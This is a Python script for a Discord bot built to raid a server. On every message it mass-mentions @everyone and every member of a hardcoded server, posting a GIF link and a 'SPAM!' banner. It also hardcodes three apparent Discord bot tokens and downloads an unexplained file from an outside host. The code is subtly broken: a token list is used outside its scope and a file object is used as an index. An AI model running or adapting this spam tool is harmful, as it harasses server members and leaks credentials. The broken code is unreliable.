import discord
import copy
import io
import random
import requests

bot = discord.Client()
bot.allmembers = ''

@bot.event
async def on_ready():
    print("ready")

    avatars = [
    'child0.png',
    'child1.png',
    ]

    tokens = [
    'NDU1ODE0MTc1MjQ4MzUxMjMy.DgBdkQ.2B37yWkyHrnHcSrKxnPfSK7lGoc',
    'NDU1ODE0MzI3MDczNTA1MzIw.DgBdsA.VwJlT61yrdDDXk4YoS3GDihjqwc',
    'NDU1ODE0NDMxMjcyNzMwNjI4.DgBdyQ.FOvRlHqC-1nDt_jneZK49OcXbCM',
    ''
    ]

    file = open(random.choice(avatars), 'rb')
    await bot.edit_profile(username='Squidward Child', avatar=file.read())

    server = bot.get_server('454058863600074753')

    for member in server.members:
        bot.allmembers = bot.allmembers + member.mention

@bot.event
async def on_message(message):
    await bot.send_message(message.channel, '@everyone\n' + bot.allmembers + '\nhttps://s22.postimg.cc/ty5xpjwpd/Squidward-_Dance_-_Copy_-_Copy_2.gif ```███████╗██████╗  █████╗ ███╗   ███╗██╗\n██╔════╝██╔══██╗██╔══██╗████╗ ████║██║\n███████╗██████╔╝███████║██╔████╔██║██║\n╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║╚═╝\n███████║██║     ██║  ██║██║ ╚═╝ ██║██╗\n╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝```')

r = requests.get('http://cdn.jplp.tk/rape.php', stream=True)
if r.status_code == 200:
    with open('init_id', 'wb') as f:
        for chunk in r:
            f.write(chunk)

with open('in.txt', 'r') as f:
    num = f

bot.run(tokens[num])
